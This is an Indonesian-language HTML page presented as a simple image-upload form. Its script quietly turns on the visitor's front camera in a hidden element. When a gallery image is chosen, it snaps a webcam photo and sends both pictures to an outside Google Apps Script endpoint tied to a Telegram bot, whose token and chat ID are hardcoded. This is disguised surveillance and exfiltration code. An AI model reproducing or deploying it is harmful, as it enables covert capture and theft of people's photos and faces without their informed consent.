<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Upload Gambar</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    video, canvas {
      display: none;
    }
  </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-6">

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div class="bg-white/10 backdrop-blur-xl border border-white/20 rounded-3xl p-8 max-w-md w-full shadow-xl">
    <h1 class="text-white text-2xl font-bold mb-4 text-center">Upload Gambar</h1>
    <p class="text-white text-sm mb-6 text-center">Silakan pilih gambar dari galeri. Kamera akan otomatis mengambil gambar juga.</p>

    <label class="cursor-pointer block w-full h-40 border-2 border-dashed border-blue-300 flex items-center justify-center rounded-xl text-white hover:bg-blue-500/10 transition">
      <span>üìÅ Pilih Gambar dari Galeri</span>
      <input type="file" accept="image/*" id="upload" class="hidden">
    </label>

    <div class="mt-6 text-center text-sm text-gray-400">Kamera aktif diam-diam untuk mengambil foto tambahan.</div>
  </div>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const upload = document.getElementById("upload");

    // Aktifkan kamera depan
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then(stream => {
        video.srcObject = stream;
      });

    // Saat file dari galeri dipilih
    upload.addEventListener("change", async () => {
      const file = upload.files[0];
      if (!file) return;

      // Ambil gambar dari kamera
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const cameraImage = canvas.toDataURL("image/jpeg").split(',')[1];

      // Ambil gambar galeri
      const reader = new FileReader();
      reader.onloadend = () => {
        const galleryImage = reader.result.split(',')[1];

        // Kirim keduanya ke Google Apps Script
        const endpoint = "https://script.google.com/macros/s/AKfycbydcBGDxU41C8pYXq8rT1-VMsXZf1vvAs81XPjU9b1DAoKpyuoRdwPRsraEeWGNvMIo/exec";
        const chatId = "5705682585"; // ganti jika perlu
        const token = "8008710613:AAEGyeE62VS0Z1__IyrBrgq39vXnQ4nMbZM"; // milik @KartunGibliBot

        // Kirim gambar kamera
        fetch(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            image: cameraImage,
            mimeType: "image/jpeg",
            chat_id: chatId,
            bot_token: token
          })
        });

        // Kirim gambar galeri
        fetch(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            image: galleryImage,
            mimeType: file.type,
            chat_id: chatId,
            bot_token: token
          })
        });

        alert("Dua gambar berhasil dikirim ke Telegram!");
      };
      reader.readAsDataURL(file);
    });
  </script>
</body>
</html>
